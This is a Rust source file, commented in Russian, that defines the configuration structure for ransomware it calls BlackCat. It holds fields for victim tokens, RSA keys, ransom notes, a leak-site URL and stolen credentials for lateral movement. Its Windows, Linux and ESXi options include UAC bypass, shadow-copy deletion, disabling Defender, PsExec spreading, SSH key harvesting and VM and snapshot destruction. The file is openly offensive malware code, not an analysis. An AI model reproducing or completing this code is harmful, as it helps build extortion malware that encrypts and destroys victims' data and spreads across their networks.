use serde::{Deserialize, Serialize};
use std::collections::HashMap;

#[derive(Debug, Serialize, Deserialize, Clone)]
pub struct BlackCatConfig {
    /// Уникальный идентификатор жертвы (access token)
    pub access_token: String,
    
    /// RSA публичный ключ в формате PEM (4096 бит)
    pub rsa_public_key: String,
    
    /// Расширение для зашифрованных файлов
    pub encryption_extension: String,
    
    /// Процессы для завершения (kill_processes)
    pub kill_processes: Vec<String>,
    
    /// Сервисы для завершения (kill_services)
    pub kill_services: Vec<String>,
    
    /// Директории для исключения
    pub exclude_directories: Vec<String>,
    
    /// Расширения файлов для исключения
    pub exclude_extensions: Vec<String>,
    
    /// Режим шифрования: Full, Fast, DotPattern, Auto
    #[serde(default = "default_encryption_mode")]
    pub encryption_mode: String,
    
    /// Для Fast режима: количество MB для шифрования в начале файла
    #[serde(default)]
    pub fast_mode_mb: u32,
    
    /// Для DotPattern: интервал между зашифрованными блоками
    #[serde(default)]
    pub dot_pattern_interval: u32,
    
    /// Текст ransom note (короткий)
    pub ransom_note_short: String,
    
    /// Текст ransom note (длинный)
    pub ransom_note_full: String,
    
    /// URL на leak site
    pub leak_site_url: String,
    
    /// Украденные credentials для lateral movement
    pub credentials: HashMap<String, CredentialSet>,
    
    /// Platform-specific опции
    #[serde(default)]
    pub windows_options: WindowsOptions,
    
    #[serde(default)]
    pub linux_options: LinuxOptions,
    
    #[serde(default)]
    pub esxi_options: ESXiOptions,
}

#[derive(Debug, Serialize, Deserialize, Clone)]
pub struct CredentialSet {
    pub username: String,
    pub password: String,
    pub domain: Option<String>,
    pub hash: Option<String>,
}

#[derive(Debug, Serialize, Deserialize, Clone, Default)]
pub struct WindowsOptions {
    pub enable_uac_bypass: bool,
    pub enable_shadow_copy_deletion: bool,
    pub enable_defender_disable: bool,
    pub enable_psexec_propagation: bool,
    pub psexec_targets: Vec<String>,
}

#[derive(Debug, Serialize, Deserialize, Clone, Default)]
pub struct LinuxOptions {
    pub enable_ssh_key_harvesting: bool,
    pub enable_lateral_movement: bool,
    pub target_ssh_keys: Vec<String>,
    pub encrypt_all_users: bool,
}

#[derive(Debug, Serialize, Deserialize, Clone, Default)]
pub struct ESXiOptions {
    pub enable_vm_encryption: bool,
    pub enable_vm_termination: bool,
    pub enable_snapshot_deletion: bool,
    pub target_datastores: Vec<String>,
}

fn default_encryption_mode() -> String {
    "Full".to_string()
}

impl BlackCatConfig {
    /// Парсит JSON конфигурацию из строки
    pub fn from_json(json: &str) -> Result<Self, serde_json::Error> {
        serde_json::from_str(json)
    }
    
    /// Конвертирует конфигурацию в JSON
    pub fn to_json(&self) -> Result<String, serde_json::Error> {
        serde_json::to_string_pretty(self)
    }
    
    /// Валидирует конфигурацию
    pub fn validate(&self) -> Result<(), String> {
        if self.access_token.is_empty() {
            return Err("access_token не может быть пустым".to_string());
        }
        if self.rsa_public_key.is_empty() {
            return Err("rsa_public_key не может быть пустым".to_string());
        }
        if self.encryption_extension.is_empty() {
            return Err("encryption_extension не может быть пустым".to_string());
        }
        Ok(())
    }
}

